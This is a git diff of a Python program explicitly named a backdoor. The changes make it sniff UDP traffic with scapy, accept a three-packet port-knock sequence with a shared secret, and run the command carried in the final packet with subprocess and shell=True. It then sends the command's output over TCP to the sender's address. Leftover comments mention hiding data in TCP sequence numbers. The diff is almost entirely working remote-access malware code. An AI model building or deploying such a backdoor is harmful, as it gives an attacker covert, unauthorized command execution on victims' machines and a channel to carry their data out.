@@ -137,14 +137,11 @@ def stega_receive(address, port):
 #         return False
 
 
-
 def run_commands(command):
-    # result = subprocess.run(['ls', '-l'], stdout=subprocess.PIPE)
-    # result.stdout.decode('utf-8')
-    # print(result.decode('utf-8'))
-
-    result = subprocess.run(['ls', '-l'], capture_output=True, text=True).stdout
-    result2 = subprocess.run([command], capture_output=True, text=True).stdout
+    # result = subprocess.run(['ls', '-l'], capture_output=True, text=True).stdout
+    result2 = subprocess.run(command, capture_output=True, text=True, shell=True).stdout
+    print(result2)
+    return result2
 
 
 def start_backdoor():
@@ -172,65 +169,79 @@ def start_backdoor():
     port1 = config['receiver_port1']
     port2 = config['receiver_port2']
     port3 = config['receiver_port3']
-    sender_addr = config['sender_address']
+    # sender_addr = config['sender_address']
     sender_port = config['sender_port']
     port_knock_auth = config['port_knock_auth']
 
-    # Start sniffing.
-    sniff(prn=sniff_process_pkt, filter="udp", store=0)
+    # Start sniffing, callback function to process each packet.
+    sniff(prn=process_sniff_pkt, filter="udp", store=0)
     # sniff_port_knock(receiver_addr, port1, port2, port3, sender_addr, sender_port, port_knock_auth)
 
 
-def sniff_process_pkt(pkt):
+def process_sniff_pkt(pkt):
     global knock_order
 
     ip_dst = pkt.payload.dst
-    print(f"IP Dest: {ip_dst}")
+
+    if ip_dst != receiver_addr:
+        return
 
     dst_port = pkt.payload.payload.dport
-    print(f"Dst Port: {dst_port}")
+    check_data = bytes(pkt.payload.payload.payload)
+    try:
+        encoded_input = check_data.decode("utf-8")
+    except UnicodeDecodeError:
+        # print("Unauthorized Non-unicode payload for backdoor.")
+        return
 
-    data = pkt.payload.payload.payload
-    print(f"Payload: {data}")
+    data = check_data.decode("utf-8")
+
+    # if type(check_data) == bytes:
+    #     print(f"Payload: {check_data.decode('utf-8')}")
+    #     data = check_data.decode('utf-8')
 
     if knock_order == 0:
-        if ip_dst == receiver_addr and dst_port == port1 and data == port_knock_auth:
-            print(f"First knock valid")
+        if dst_port == port1 and data == port_knock_auth:
+            # print(f"First knock valid")
             knock_order = 1
         else:
-            print(f"First Knock Failed.")
+            # print(f"First knock Failed")
+            knock_order = 0
     elif knock_order == 1:
-        if ip_dst == receiver_addr and dst_port == port2 and data == port_knock_auth:
-            print(f"Second knock valid")
+        if dst_port == port2 and data == port_knock_auth:
+            # print(f"Second knock valid")
             knock_order = 2
         else:
-            print(f"Second Knock Failed.")
+            # print(f"Second Knock Failed.")
             knock_order = 0
-    elif knock_order == 3:
-        if ip_dst == receiver_addr and dst_port == port2 and data == port_knock_auth:
-            print(f"Third knock valid")
-            print(f"Data: {data}")
+    elif knock_order == 2:
+        final_payload = data.split('|')
+        auth_string = final_payload[0]
+        command = final_payload[1]
+        address = pkt.payload.src
+        if dst_port == port3 and auth_string == port_knock_auth:
+            # print(f"Third knock valid")
+            # print(f"Data: {command}")
+            result = run_commands(command)
+            send_command_output(result, address, sender_port)
             knock_order = 0
         else:
-            print(f"Third Knock Failed.")
+            # print(f"Third Knock Failed.")
             knock_order = 0
 
+    # print(f"IP Dest: {ip_dst}")
+    # print(f"Dst Port: {dst_port}")
+    # print(data)
 
-    # if len(data)
 
-
-    # data = ""
-    # sender = ""
-    # for pkt in capture:
-    #     flags = pkt.payload.payload.flags
-    #     if flags == "PA":
-    #         sender = pkt.payload.src
-    #         stega_data = abs(pkt.payload.payload.seq) % 1000
-    #         data += chr(stega_data)
-    #
-    # secret_data = encryption.decrypt(data.encode("ascii")).decode("ascii")
-    # print(f"({sender}): {data}")
-    # print(f"({sender}): {secret_data}")
+def send_command_output(data, address, port):
+    # IPv4 Socket connection to receiver.
+    # hostname = socket.gethostname()
+    # IPAddr = socket.gethostbyname(hostname)
+    with sock.socket(sock.AF_INET, sock.SOCK_STREAM) as my_sock:
+        my_sock.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)
+        my_sock.connect((address, port))
+        my_sock.sendall(data.encode("utf-8"))
 
 
 if __name__ == "__main__":
